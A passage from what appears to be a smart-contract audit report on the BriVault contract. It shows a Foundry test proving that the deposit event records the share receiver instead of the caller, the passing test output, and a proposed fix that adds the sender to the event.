        mockToken.approve(address(briVault), 20 ether);
        // user1 deposits funds into the vault, but the address receiving the shares is user2
        briVault.deposit(20 ether, user2);
        vm.stopPrank();
        
        Vm.Log[] memory logs = vm.getRecordedLogs();
        
        // Check logs
        address depositor = address(0);
        for (uint i=0; i<logs.length; i++) {
            if (logs[i].topics[0] == keccak256("deposited(address,uint256)")) {
                depositor = address(uint160(uint256(logs[i].topics[1])));
                break;
            }
        }
        
        vm.assertTrue(depositor != address(0));
        vm.assertTrue(user1 != depositor);
    }
```

* The console output is as follows:

```shell
Ran 1 test for test/briVault.t.sol:BriVaultTest
[PASS] test__deposit_whenCallerNotEqualReceiver() (gas: 178469)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.20ms (234.60µs CPU time)
```

## Recommended Mitigation

* Follow the ERC4626 standard practice by including complete parameters in the event, properly defining "sender" and "owner".

```diff
-    event deposited (address indexed _depositor, uint256 _value);
+    event deposited (address indexed _sender, address indexed _depositor, uint256 _value);

    function deposit(uint256 assets, address receiver) public override returns (uint256) {
        // Original code ...
	
-	    emit deposited (receiver, stakeAsset);
+	    emit deposited (msg.sender, receiver, stakeAsset);
    
	    // Original code ...
    }
```





    